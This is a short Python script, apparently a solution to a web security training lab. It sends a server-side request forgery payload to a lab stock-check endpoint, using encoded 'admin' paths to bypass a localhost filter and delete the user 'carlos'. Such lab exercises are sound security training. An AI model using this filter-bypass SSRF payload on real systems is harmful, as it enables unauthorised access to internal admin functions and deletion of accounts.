# <FMI> (Fill Me In) denotes a value you will need to modify
import requests

stock_url = 'https://acb21ff41f945fbac077119800c60072.web-security-academy.net/product/stock'

stock_api_data = {
    # 'stockApi': 'http://127.1/%2561dmin/delete?username=carlos'
    'stockApi': 'http://127.1/admi%6E/delete?username=carlos'
}
resp = requests.post(stock_url, data=stock_api_data)
print(resp.text)
